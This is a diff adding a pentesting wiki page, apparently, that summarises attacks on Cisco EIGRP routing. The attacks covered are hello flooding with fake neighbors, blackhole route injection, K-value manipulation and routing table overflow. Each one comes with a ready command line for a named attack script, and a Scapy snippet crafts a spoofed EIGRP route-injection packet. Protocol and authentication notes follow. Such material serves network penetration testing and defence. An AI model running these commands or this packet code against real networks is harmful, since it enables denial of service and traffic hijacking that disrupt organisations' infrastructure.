@@ -1,0 +1,94 @@
+# EIGRP Attacks
+
+**This is a summary of the attacks exposed in** [**https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9**](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9). Check it for further information.
+
+## **Fake EIGRP Neighbors Attack**
+
+- **Objective**: To overload router CPUs by flooding them with EIGRP hello packets, potentially leading to a Denial of Service (DoS) attack.
+- **Tool**: **helloflooding.py** script.
+- **Execution**:
+  ```bash
+  ~$ sudo python3 helloflooding.py --interface eth0 --as 1 --subnet 10.10.100.0/24
+  ```
+- **Parameters**:
+  - `--interface`: Specifies the network interface, e.g., `eth0`.
+  - `--as`: Defines the EIGRP autonomous system number, e.g., `1`.
+  - `--subnet`: Sets the subnet location, e.g., `10.10.100.0/24`.
+
+## **EIGRP Blackhole Attack**
+
+- **Objective**: To disrupt network traffic flow by injecting a false route, leading to a blackhole where the traffic is directed to a non-existent destination.
+- **Tool**: **routeinject.py** script.
+- **Execution**:
+  ```bash
+  ~$ sudo python3 routeinject.py --interface eth0 --as 1 --src 10.10.100.50 --dst 172.16.100.140 --prefix 32
+  ```
+- **Parameters**:
+  - `--interface`: Specifies the attacker’s system interface.
+  - `--as`: Defines the EIGRP AS number.
+  - `--src`: Sets the attacker’s IP address.
+  - `--dst`: Sets the target subnet IP.
+  - `--prefix`: Defines the mask of the target subnet IP.
+
+## **Abusing K-Values Attack**
+
+- **Objective**: To create continuous disruptions and reconnections within the EIGRP domain by injecting altered K-values, effectively resulting in a DoS attack.
+- **Tool**: **relationshipnightmare.py** script.
+- **Execution**:
+  ```bash
+  ~$ sudo python3 relationshipnightmare.py --interface eth0 --as 1 --src 10.10.100.100
+  ```
+- **Parameters**:
+  - `--interface`: Specifies the network interface.
+  - `--as`: Defines the EIGRP AS number.
+  - `--src`: Sets the IP Address of a legitimate router.
+
+## **Routing Table Overflow Attack**
+
+- **Objective**: To strain the router's CPU and RAM by flooding the routing table with numerous false routes.
+- **Tool**: **routingtableoverflow.py** script.
+- **Execution**:
+  ```bash
+  sudo python3 routingtableoverflow.py --interface eth0 --as 1 --src 10.10.100.50
+  ```
+- **Parameters**:
+  - `--interface`: Specifies the network interface.
+  - `--as`: Defines the EIGRP AS number.
+  - `--src`: Sets the attacker’s IP address.
+
+## **Protocol Notes Useful for Attacks**
+
+- **HELLO packets carry K-values and neighbors only form when they match.** This is the basis for K-value mismatch/relationship disruption attacks and why mismatched K-values prevent adjacency.
+- **The PARAMETER TLV (Type 0x0001) in HELLO (and initial UPDATE) carries K-values and Hold Time**, so passive captures reveal the exact values used on the segment.
+
+## **Scapy Packet Crafting (Route Injection / Fake Neighbors)**
+
+Scapy ships an EIGRP contrib layer with TLVs like `EIGRPParam` and `EIGRPIntRoute`, which is enough to craft UPDATEs for route injection. Example adapted from the `davidbombal/scapy` EIGRP route injection script:
+
+```python
+from scapy.all import *
+load_contrib("eigrp")
+
+sendp(Ether()/IP(src="192.168.1.248", dst="224.0.0.10") /
+      EIGRP(opcode="Update", asn=100, seq=0, ack=0,
+            tlvlist=[EIGRPIntRoute(dst="192.168.100.0",
+                                   nexthop="192.168.1.248")]))
+```
+
+The same repo includes quick "fake neighbor" scripts that sniff a real EIGRP packet and replay it with a spoofed source IP to create phantom neighbors (useful for CPU/neighbor-table pressure).
+
+- Scapy EIGRP contrib docs: https://scapy.readthedocs.io/en/latest/api/scapy.contrib.eigrp.html
+- Example scripts: https://github.com/davidbombal/scapy
+
+## **Routopsy & NSE Helpers**
+
+- **Routopsy** builds a virtual-router attack lab (FRRouting + Scapy) and includes DRP attacks you can adapt for EIGRP tests. https://sensepost.com/blog/2020/routopsy-hacking-routing-with-routers/
+- Nmap's NSE has a small `eigrp` library for parsing/generating a subset of EIGRP packets. https://nmap.org/nsedoc/lib/eigrp.html
+
+## **Authentication Recon**
+
+- EIGRP named mode supports **HMAC-SHA-256 authentication** via `authentication mode hmac-sha-256 ...`. If enabled, crafted packets must be authenticated with the correct key; if not enabled, spoofing/injection is easier to validate.
+
+## **References**
+- [https://www.rfc-editor.org/rfc/rfc7868.html](https://www.rfc-editor.org/rfc/rfc7868.html)
+- [https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/iproute_eigrp/configuration/15-mt/ire-15-mt-book/ire-sha-256.html](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/iproute_eigrp/configuration/15-mt/ire-15-mt-book/ire-sha-256.html)
